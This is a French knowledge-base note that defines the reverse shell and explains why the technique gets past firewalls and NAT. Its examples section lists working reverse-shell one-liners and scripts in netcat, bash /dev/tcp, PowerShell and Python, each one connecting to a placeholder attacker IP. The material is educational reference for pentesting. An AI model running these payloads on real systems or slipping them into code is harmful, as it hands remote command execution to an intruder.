---
aliases:
  - Reverse Shell
  - Shell inversé
  - ReverseShell
  - Inverted Shell
archetype: definition
cssclasses:
  - max
tags:
  - attaque/reverse-shell
  - attaque/exploitation
  - pentest
  - red-teaming
  - firewall
  - nat
  - shell
  - bind-shell
  - outil/netcat
  - langage/bash
  - langage/powershell
  - langage/python
---

# Reverse Shell

> [!question] C'est quoi ?
> Une **reverse shell** est un mécanisme permettant à une machine cible d'initier une connexion réseau sortante vers une machine attaquante, offrant à l'attaquant la capacité d'exécuter des commandes sur la machine cible à distance.

## 📜 Origine / Contexte
> [!info] Le saviez-vous ?
> Le concept de shell inversé est apparu comme une solution aux limitations des **bind shells**. Traditionnellement, un _bind shell_ implique qu'un programme d'écoute (listener) est exécuté sur la machine cible, attendant que l'attaquant se connecte. Cependant, cette approche est souvent bloquée par les firewalls ou les dispositifs NAT (Network Address Translation) qui empêchent les connexions entrantes non sollicitées vers le réseau interne. La *reverse shell* contourne ce problème en faisant en sorte que la machine cible _initie_ elle-même la connexion vers l'attaquant, les connexions sortantes étant généralement moins restreintes. Ce principe permet ainsi à un attaquant de prendre le contrôle d'une machine même si elle est derrière un pare-feu ou un routeur NAT.

## 💡 Exemples Concrets
Les reverse shells sont couramment utilisées en **pentesting** et en **red teaming** pour établir un accès persistant ou pour contourner les mesures de sécurité réseau.

*   **Cas d'usage : Contournement de NAT/firewall** : Un attaquant compromet un serveur web derrière un firewall. Au lieu d'essayer de se connecter directement au port du serveur (qui est bloqué par le firewall), il exécute une commande sur le serveur qui initie une connexion vers l'adresse IP et le port de l'attaquant.
*   **Exemple avec Netcat** :
    *   Machine attaquante (écoute) : `nc -lvp 4444`
    *   Machine cible (initie la connexion) : `nc -e /bin/bash <IP_ATTAQUANT> 4444`
*   **Exemple avec Bash** :
    *   Machine attaquante (écoute) : `nc -lvp 4444`
    *   Machine cible (initie la connexion) : `bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1`
*   **Exemple avec PowerShell (Windows)** :
    *   Machine attaquante (écoute) : `nc -lvp 4444`
    *   Machine cible (initie la connexion) :
        ```powershell
        $client = New-Object System.Net.Sockets.TCPClient('<IP_ATTAQUANT>', 4444);
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{0};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
            ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = ($sendback + 'PS ' + (pwd).Path + '> ');
            $bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($bytes2,0,$bytes2.Length);
            $stream.Flush()
        };
        $client.Close()
        ```
*   **Exemple avec Python** :
    *   Machine attaquante (écoute) : `nc -lvp 4444`
    *   Machine cible (initie la connexion) :
        ```python
        import socket,subprocess,os;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("<IP_ATTAQUANT>",4444));
        os.dup2(s.fileno(),0);
        os.dup2(s.fileno(),1);
        os.dup2(s.fileno(),2);
        p=subprocess.call(["/bin/sh","-i"]);
        ```